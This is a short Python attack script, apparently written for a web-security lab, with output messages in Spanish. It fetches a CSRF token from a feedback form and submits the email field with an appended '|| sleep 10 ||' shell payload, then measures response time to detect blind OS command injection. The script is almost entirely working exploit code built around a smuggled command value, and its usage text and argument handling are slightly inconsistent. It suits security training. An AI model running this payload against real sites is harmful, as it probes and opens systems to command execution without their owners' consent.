import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    path = '/feedback'
    r = s.get(f"{url}{path}", verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf_input = soup.find("input",{"name": "csrf"})
    print(csrf_input)    

    if csrf_input:
        return csrf_input['value']
    return None

def check_command_injection(s, url):
    path = '/feedback/submit'
    command_injection = '|| sleep 10 ||'
    csrf_token = get_csrf_token(s, url)
    params = {
        'csrf': csrf_token,
        'name': 'lspci4',
        'email': f'lspci4%40lspci4.com{command_injection}',
        'subject': 'test',
        'message': 'test'
        }
    r = s.post(f"{url}{path}",data=params, verify=False, proxies=proxies)
    if (r.elapsed.total_seconds()>10):
        print("[+] Campo email es vulnerable a time-based command injection")
    else:
        print("[-] Campo email no es vulnerable a time-base command injection.")


def main():
    if len(sys.argv) != 2:
        print(f"[+] Uso: {sys.argv[0]} <url> <command>")
        print(f"Ejemplo: {sys.argv[0]} www.example.com || sleep 10 ||")
        return
    
    url = sys.argv[1]
    command = sys.argv[1]
    print("[+] Checkeando si el parametro email es vulnerable a time-based command injection...")
    
    s = requests.session()
    check_command_injection(s, url)


if __name__== "__main__":
    main()